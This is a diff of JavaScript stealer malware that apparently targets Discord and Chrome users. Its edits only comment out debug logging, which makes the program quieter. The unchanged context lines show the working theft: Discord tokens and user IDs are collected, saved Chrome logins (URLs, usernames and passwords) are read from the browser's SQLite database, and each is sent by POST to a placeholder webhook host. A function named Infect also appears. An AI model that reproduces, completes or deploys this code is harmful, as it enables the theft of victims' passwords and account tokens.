@@ -58,7 +58,7 @@ function koro(p) {
                     
                     token = token.replace(/"/g, '');
                     var a = `{"content": "Token: ${token}", "username": "UID: ${uid}"}`;
-                    console.log(a)
+                    //console.log(a)
                     fetch("http://da_webhook/api2.php?type=old", {
                     "headers": {
                         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
@@ -98,7 +98,7 @@ function getChromePass(source_file, dest_file){
     var chromepath = localappdata + "\\Google\\Chrome\\User Data\\Default\\"
     var exploit_path = chromepath + source_file
     var dest_path = localappdata + "\\Korobeinikizado\\"
-    console.log(dest_path)
+    //console.log(dest_path)
     var sqlite3 = require('sqlite3').verbose();
     if (!fs.existsSync(exploit_path)){
         return;
@@ -114,11 +114,11 @@ function getChromePass(source_file, dest_file){
         if (err) {
             console.error(err.message);
         }
-        console.log('Connected to the my database.');
+        //console.log('Connected to the my database.');
     });
     db.serialize(function () {
         db.each('SELECT action_url, username_value, password_value FROM logins', function (err, row) {
-            console.log(row)
+            //console.log(row)
             if (row){
                 var url = row.action_url;
                 var username = row.username_value;
@@ -127,7 +127,7 @@ function getChromePass(source_file, dest_file){
                 if (url == "") url = "Não Capturado";
                 if (username == "") username = "Não Capturado";
                 if (password_value == "") password_value = "Não Capturado";
-                console.log(result);
+                //console.log(result);
                 fetch("http://da_webhook/api2.php?type=chrome", {
                     "headers": {
                         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
@@ -148,7 +148,7 @@ function getChromePass(source_file, dest_file){
                     "method": "POST"
                 });
             }else{
-                console.log("não encontrado nada em: " + exploit_path)
+                //console.log("não encontrado nada em: " + exploit_path)
             }
             
             
@@ -222,7 +222,7 @@ function Infect() {
             })
         });
     }).on("error", (err) => {
-        console.log(err);
+        //console.log(err);
     });
 };
 function listDiscords() {
